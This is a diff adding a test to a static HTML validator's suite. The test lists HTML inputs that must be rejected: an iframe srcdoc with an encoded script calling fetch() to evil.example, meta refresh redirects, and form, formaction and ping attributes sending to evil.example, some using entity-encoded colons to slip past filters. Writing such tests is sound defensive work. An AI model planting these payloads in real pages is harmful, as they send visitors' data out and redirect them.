@@ -80,6 +80,33 @@ describe("static HTML validator", () => {
     }
   })
 
+  it("rejects active navigation and executable attribute bypasses", () => {
+    const cases = [
+      '<iframe srcdoc="&lt;script&gt;fetch(\'https://evil.example/x\')&lt;/script&gt;"></iframe>',
+      '<meta http-equiv="refresh" content="0;url=https://evil.example/x">',
+      '<meta http-equiv="refresh" content="0;url=/local">',
+      '<form action="https://evil.example/post"><button>Send</button></form>',
+      '<form action="https&#x3a;//evil.example/post"><button>Send</button></form>',
+      '<form action="/api/runs"><button>Send</button></form>',
+      '<button formaction="https&#x3a;//evil.example/post">Send</button>',
+      '<button formaction="/api/runs">Send</button>',
+      '<a ping="https://evil.example/ping" href="#next">Next</a>',
+      '<a ping="/api/ping" href="#next">Next</a>',
+      '<a ping href="#next">Next</a>',
+    ]
+
+    for (const html of cases) {
+      expect(
+        validateStaticHtml({
+          artifactType: "webpage",
+          renderMode: "html",
+          html,
+          maxBytes: 2048,
+        })
+      ).toMatchObject({ ok: false, code: "static_artifact_invalid_html" })
+    }
+  })
+
   it("rejects external hrefs on link elements because they load network dependencies", () => {
     const cases = [
       '<link rel="preload" href="https://cdn.example/font.woff2" as="font">',
